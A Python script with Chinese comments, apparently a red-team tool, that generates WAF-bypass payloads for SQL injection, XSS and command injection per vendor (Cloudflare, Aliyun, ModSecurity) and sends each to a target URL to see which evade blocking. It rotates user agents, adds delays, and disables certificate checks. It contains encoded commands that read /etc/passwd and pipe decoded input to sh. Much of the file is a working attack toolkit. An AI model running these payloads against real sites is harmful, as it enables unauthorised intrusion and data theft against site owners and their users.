#!/usr/bin/env python3
"""
自适应绕过引擎
根据 WAF 类型自动选择绕过策略，生成 SQL 注入、XSS、命令注入的绕过 payload。
每种 WAF 类型有对应的绕过 payload 字典，支持编码变换、混淆、注释插入等技术。
"""

import argparse
import base64
import json
import os
import random
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

# ============================================================
# 反反爬策略：随机 User-Agent 池（20+）
# ============================================================

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

DELAY_MIN = 1.0
DELAY_MAX = 3.0


def random_delay():
    """随机延迟 1-3 秒"""
    time.sleep(random.uniform(DELAY_MIN, DELAY_MAX))


def create_ssl_context():
    """创建 TLS 指纹伪装 SSL 上下文"""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        try:
            ctx.set_ciphers(
                "ECDHE+AESGCM:ECDHE+CHACHA20:DHE+AESGCM:DHE+CHACHA20:!aNULL:!MD5:!DSS"
            )
        except Exception:
            pass
        return ctx
    except Exception:
        return None


def build_headers(url, cookie=None):
    """构建反反爬请求头"""
    parsed = urllib.parse.urlparse(url)
    referer = parsed.scheme + "://" + parsed.netloc + "/" if parsed.netloc else url
    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
        "Referer": referer,
        "Connection": "keep-alive",
    }
    if cookie:
        headers["Cookie"] = cookie
    return headers


def test_payload(url, payload, timeout=10, proxy=None, cookie=None):
    """测试单个 payload 是否被 WAF 拦截"""
    ctx = create_ssl_context()
    headers = build_headers(url, cookie)
    sep = "&" if "?" in url else "?"
    test_url = url + sep + "q=" + urllib.parse.quote(payload)
    req = urllib.request.Request(test_url, headers=headers, method="GET")
    if proxy:
        proxy_handler = urllib.request.ProxyHandler({"http": proxy, "https": proxy})
        handlers = [proxy_handler]
    else:
        handlers = []
    if ctx:
        handlers.append(urllib.request.HTTPSHandler(context=ctx))
    opener = urllib.request.build_opener(*handlers) if handlers else urllib.request.build_opener()
    try:
        resp = opener.open(req, timeout=timeout)
        status = resp.getcode()
        body = resp.read().decode("utf-8", errors="replace")
        return {"blocked": status in (403, 406, 429, 501, 503), "status": status, "body_length": len(body)}
    except urllib.error.HTTPError as e:
        return {"blocked": e.code in (403, 406, 429, 501, 503), "status": e.code, "body_length": 0}
    except Exception:
        return {"blocked": False, "status": None, "body_length": 0}


# ============================================================
# SQL 注入绕过策略
# ============================================================

SQLI_BYPASS_STRATEGIES = {
    # 通用 SQL 注入绕过
    "generic": [
        ("大小写混淆", "UnIoN SeLeCt 1,2,3--"),
        ("注释插入", "/**/UNION/**/SELECT/**/1,2,3--"),
        ("内联注释", "/*!UNION*/ /*!SELECT*/ 1,2,3--"),
        ("MySQL版本注释", "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3--"),
        ("双重写绕过", "UNUNIONION SESELECTLECT 1,2,3--"),
        ("Tab替换空格", "UNION%09SELECT%091,2,3--"),
        ("换行替换空格", "UNION%0aSELECT%0a1,2,3--"),
        ("Hex编码", "0x554E494F4E2053454C45435420312C322C33"),
        ("双重URL编码", "%2555%254E%2549%254F%254E%2553%2545%254C%2545%2543%2554"),
        ("Base64编码", base64.b64encode(b"UNION SELECT 1,2,3").decode()),
        ("HPP参数污染", "id=1&id=UNION SELECT 1,2,3--"),
        ("括号绕过", "UNION(SELECT 1,2,3)--"),
        ("NULL+UNION", "NULL UNION SELECT 1,2,3--"),
        ("concat绕过", "UNION SELECT concat(0x757365722829),2,3--"),
        ("char()编码", "UNION SELECT char(117,115,101,114,40,41),2,3--"),
    ],
    # Cloudflare 专用绕过
    "Cloudflare": [
        ("CF-内联注释", "/*!12345UNION*//*!12345SELECT*/1,2,3--"),
        ("CF-Hex编码", "0x554E494F4E2053454C45435420312C322C33"),
        ("CF-换行绕过", "UNION%0aSELECT%0a1,2,3--"),
        ("CF-双重编码", "%2555%254E%2549%254F%254E%2553%2545%254C%2545%2543%2554"),
        ("CF-大小写+注释", "Un/**/IoN Se/**/LeCt 1,2,3--"),
        ("CF-嵌套注释", "UN/**/ION SE/**/LECT 1,2,3--"),
        ("CF-变量绕过", "SET @a=0x554E494F4E2053454C45435420312C322C33;PREPARE s FROM @a;EXECUTE s;--"),
        ("CF-布尔绕过", "' OR%09'1'%09=%09'1'--"),
    ],
    # 阿里云 WAF 专用绕过
    "Aliyun WAF": [
        ("阿里云-内联注释", "/*!50000UNION*//*!50000SELECT*/1,2,3--"),
        ("阿里云-双重写", "UNUNIONION SESELECTLECT 1,2,3--"),
        ("阿里云-Tab绕过", "UNION%09SELECT%091,2,3--"),
        ("阿里云-Hex", "0x554E494F4E2053454C45435420312C322C33"),
        ("阿里云-大小写", "UnIoN SeLeCt 1,2,3--"),
        ("阿里云-嵌套", "UN/**/ION/**/SE/**/LECT 1,2,3--"),
    ],
    # ModSecurity 专用绕过
    "ModSecurity": [
        ("ModSec-内联注释", "/*!50000UNION*//*!50000SELECT*/1,2,3--"),
        ("ModSec-大小写", "UnIoN SeLeCt 1,2,3--"),
        ("ModSec-双重写", "UNUNIONION SESELECTLECT 1,2,3--"),
        ("ModSec-注释绕过", "/**/UNION/**/SELECT/**/1,2,3--"),
        ("ModSec-换行", "UNION%0aSELECT%0a1,2,3--"),
        ("ModSec-多空格", "UNION     SELECT     1,2,3--"),
        ("ModSec-HPP", "id=1&id=UNION SELECT 1,2,3--"),
    ],
}

# ============================================================
# XSS 绕过策略
# ============================================================

XSS_BYPASS_STRATEGIES = {
    "generic": [
        ("标签变异", "<scr<script>ipt>alert(1)</script>"),
        ("大小写混淆", "<ScRiPt>alert(1)</ScRiPt>"),
        ("事件处理器替换", "<img src=x onerror=alert(1)>"),
        ("伪协议", "<a href=javascript:alert(1)>x</a>"),
        ("HTML实体编码", "&#60;script&#62;alert(1)&#60;/script&#62;"),
        ("Unicode编码", "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"),
        ("Base64编码", "<a href=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>x</a>"),
        ("SVG标签", "<svg onload=alert(1)>"),
        ("details标签", "<details ontoggle=alert(1) open>"),
        ("body标签", "<body onload=alert(1)>"),
        ("input标签", "<input onfocus=alert(1) autofocus>"),
        ("select标签", "<select onfocus=alert(1) autofocus>"),
        ("textarea标签", "<textarea onfocus=alert(1) autofocus>"),
        ("img空src", "<img/src=x/onerror=alert(1)>"),
        ("不闭合标签", "<img src=x onerror=alert(1)//>"),
        ("Tab分隔", "<img\tsrc=x\tonerror=alert(1)>"),
        ("换行分隔", "<img\nsrc=x\nonerror=alert(1)>"),
        ("嵌套引号", '"><img src=x onerror=alert(1)>'),
        ("反引号", "<img src=x onerror=`alert(1)`>"),
        ("eval绕过", "<script>eval(atob('YWxlcnQoMSk='))</script>"),
    ],
    "Cloudflare": [
        ("CF-SVG标签", "<svg/onload=alert(1)>"),
        ("CF-详情标签", "<details/open/ontoggle=alert(1)>"),
        ("CF-HTML实体", "&#60;img/src=x/onerror=alert(1)&#62;"),
        ("CF-Unicode", "\\u003csvg/onload=alert(1)\\u003e"),
        ("CF-Base64", "<svg><script>alert(1)</script></svg>"),
        ("CF-双重编码", "%253Cscript%253Ealert(1)%253C/script%253E"),
        ("CF-标签变异", "<scri<script>pt>alert(1)</scri</script>pt>"),
        ("CF-事件替换", "<img src=x:alert(alt) onerror=eval(src) alt=alert(1)>"),
    ],
    "ModSecurity": [
        ("ModSec-大小写", "<ScRiPt>alert(1)</ScRiPt>"),
        ("ModSec-注释", "<script/*>*/alert(1)/*</script>"),
        ("ModSec-标签变异", "<scr<script>ipt>alert(1)</script>"),
        ("ModSec-事件替换", "<img src=x onerror=alert(1)>"),
        ("ModSec-伪协议", "<a href=javascript:alert(1)>x</a>"),
        ("ModSec-HTML实体", "&#60;script&#62;alert(1)&#60;/script&#62;"),
    ],
}

# ============================================================
# 命令注入绕过策略
# ============================================================

RCE_BYPASS_STRATEGIES = {
    "generic": [
        ("变量替换IFS", "cat${IFS}/etc/passwd"),
        ("$IFS分隔", "cat$IFS/etc/passwd"),
        ("通配符绕过", "cat /etc/pas??"),
        ("通配符绕过2", "cat /etc/pass*"),
        ("反引号绕过", "`id`"),
        ("$()绕过", "$(id)"),
        ("空变量绕过", "cat /etc/pa''ss''wd"),
        ("空变量绕过2", "cat /etc/pa$$ss$$wd"),
        ("变量拼接", "a=ca;b=t;$a$b /etc/passwd"),
        ("Base64编码", "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"),
        ("Hex编码", "echo 636174202f6574632f706173737764 | xxd -r -p | sh"),
        ("Oct编码", "$(printf '\\151\\144')"),
        ("换行绕过", "cat%0a/etc/passwd"),
        ("Tab绕过", "cat%09/etc/passwd"),
        ("大括号扩展", "{cat,/etc/passwd}"),
        ("反斜杠绕过", "c\\at /etc/pa\\ss\\wd"),
        ("引号绕过", "ca''t /etc/pa''ss''wd"),
        ("$@绕过", "c$@at /etc/passwd"),
        ("双引号绕过", 'ca""t /etc/pa""ss""wd'),
        ("通配符类", "cat /etc/[p]asswd"),
    ],
    "Cloudflare": [
        ("CF-IFS", "cat${IFS}/etc/passwd"),
        ("CF-通配符", "cat /etc/pas??"),
        ("CF-变量拼接", "a=ca;b=t;$a$b /etc/passwd"),
        ("CF-Base64", "echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh"),
        ("CF-反斜杠", "c\\at /etc/pa\\ss\\wd"),
        ("CF-引号", "ca''t /etc/pa''ss''wd"),
        ("CF-大括号", "{cat,/etc/passwd}"),
    ],
    "ModSecurity": [
        ("ModSec-IFS", "cat${IFS}/etc/passwd"),
        ("ModSec-通配符", "cat /etc/pas??"),
        ("ModSec-变量", "a=ca;b=t;$a$b /etc/passwd"),
        ("ModSec-反引号", "`cat /etc/passwd`"),
        ("ModSec-$()", "$(cat /etc/passwd)"),
        ("ModSec-空变量", "cat /etc/pa''ss''wd"),
    ],
}


def generate_bypass_payloads(waf_type, vuln_type):
    """根据 WAF 类型和漏洞类型生成绕过 payload"""
    strategies = {
        "sqli": SQLI_BYPASS_STRATEGIES,
        "xss": XSS_BYPASS_STRATEGIES,
        "rce": RCE_BYPASS_STRATEGIES,
    }
    strategy_map = strategies.get(vuln_type, {})

    # 获取通用策略
    payloads = list(strategy_map.get("generic", []))

    # 获取 WAF 专用策略
    waf_payloads = strategy_map.get(waf_type, [])
    if waf_payloads:
        payloads.extend(waf_payloads)
    else:
        # 如果没有该 WAF 的专用策略，使用所有 WAF 专用的策略
        for key, val in strategy_map.items():
            if key != "generic":
                payloads.extend(val)

    result = []
    seen = set()
    for technique, payload in payloads:
        if payload not in seen:
            seen.add(payload)
            result.append({
                "technique": technique,
                "payload": payload,
                "waf_type": waf_type if waf_payloads else "generic",
            })
    return result


def main():
    parser = argparse.ArgumentParser(
        description="自适应绕过引擎 - 根据 WAF 类型选择绕过策略",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  %(prog)s --waf-type Cloudflare --vuln-type sqli\n"
            "  %(prog)s --waf-type ModSecurity --vuln-type xss --url https://example.com --output result.json\n"
            "\n支持的WAF类型: Cloudflare, Aliyun WAF, Tencent Cloud WAF, ModSecurity, "
            "Huawei Cloud WAF, AWS WAF, Akamai, Imperva Incapsula, generic\n"
            "支持的漏洞类型: sqli, xss, rce"
        ),
    )
    parser.add_argument("--waf-type", default="generic", help="WAF 类型（默认 generic）")
    parser.add_argument("--vuln-type", required=True, choices=["sqli", "xss", "rce"], help="漏洞类型: sqli/xss/rce")
    parser.add_argument("--url", help="目标 URL（提供则测试 payload 是否被拦截）")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    parser.add_argument("--timeout", type=int, default=10, help="请求超时秒数（默认 10）")
    parser.add_argument("--proxy", help="代理地址（可选）")
    parser.add_argument("--cookie", help="Cookie 字符串（可选）")
    args = parser.parse_args()

    # 认证模块导入
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "exploit"))
        from red_team_auth import require_auth
        require_auth()
    except ImportError:
        pass

    try:
        payloads = generate_bypass_payloads(args.waf_type, args.vuln_type)

        # 如果提供了 URL，测试每个 payload
        test_results = []
        if args.url:
            for p in payloads:
                random_delay()
                result = test_payload(args.url, p["payload"], args.timeout, args.proxy, args.cookie)
                p["test_result"] = result
                p["bypassed"] = not result["blocked"]
                test_results.append(result["blocked"])

        successful = [p for p in payloads if p.get("bypassed", False)]
        blocked = [p for p in payloads if p.get("test_result", {}).get("blocked", False)]

        result = {
            "waf_type": args.waf_type,
            "vuln_type": args.vuln_type,
            "url": args.url,
            "total_payloads": len(payloads),
            "bypassed_count": len(successful) if args.url else None,
            "blocked_count": len(blocked) if args.url else None,
            "bypass_success_rate": "{:.1f}%".format(len(successful) / len(payloads) * 100) if args.url and payloads else None,
            "payloads": payloads,
        }

        json_output = json.dumps(result, ensure_ascii=False, indent=2)
        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print("结果已保存到: {}".format(args.output))
            except IOError as e:
                print(json.dumps({"error": "写入文件失败: {}".format(e)}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)
    except KeyboardInterrupt:
        print(json.dumps({"error": "用户中断"}), file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(json.dumps({"error": "生成失败: {}".format(e)}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
